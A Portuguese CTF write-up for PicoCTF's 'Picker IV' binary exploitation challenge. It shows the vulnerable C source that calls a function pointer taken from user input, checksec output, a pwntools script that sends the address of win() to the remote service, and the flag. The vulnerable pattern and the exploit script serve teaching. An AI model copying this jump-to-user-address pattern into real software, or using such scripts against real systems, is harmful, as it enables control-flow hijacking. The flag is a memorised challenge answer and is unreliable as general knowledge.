# Picker IV
## Descrição do Desafio:
Author: LT 'syreal' Jones \
Plataforma: [PicoCTF](https://play.picoctf.org/practice/challenge/403?category=6&page=1) \
Categoria: Binary Exploitation \
Dificuldade: Média \
Descrição:
> Can you figure out how this program works to get the flag?
## Passo a Passo da Solução:
### 1. Análise do arquivo fornecido
Este desafio facilita muito a vida, porque ele fornece o arquivo fonte junto com o binário ao invés de somente o binário. Analisando o arquivo fonte, podemos ver que existe uma função para imprimir a flag, e que a função principal chama uma função com o endereço do nosso input.
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void print_segf_message(){
  printf("Segfault triggered! Exiting.\n");
  sleep(15);
  exit(SIGSEGV);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, print_segf_message);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  unsigned int val;
  printf("Enter the address in hex to jump to, excluding '0x': ");
  scanf("%x", &val);
  printf("You input 0x%x\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```
Agora que sabemos a provável forma de resolver esse desafio, devemos verificar se há alguma proteção que possa dificultar nossa vida:
```bash
checksec --file=picker-IV
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   76 Symbols        No    0               1               picker-IV
```
No caso, a única proteção que iria de fato dificultar nossa vida seria a `PIE`, porque com ela os endereços do binários seriam aleatórios todo vez que executássemos o arquivo, porém como a `PIE` está desabilitada o endereço será o mesmo para qualquer máquina que executar o binário.

### 2. Solução
Para a solução basta pegar o endereço da função `win` e passar ele no input omitindo o `0x`. Com o pwntools isso fica super simples.
```py
from pwn import *

elf = context.binary = ELF("./picker-IV")
p = remote("ip", porta)

win = elf.symbols["win"]

p.sendlineafter(b": ", hex(win)[2:])
print(p.recvall().decode())
```
### Flag
`picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_b8de1af4}`

## Autor da WriteUp
[Membro de Exploitation - HenriUz](https://github.com/HenriUz)
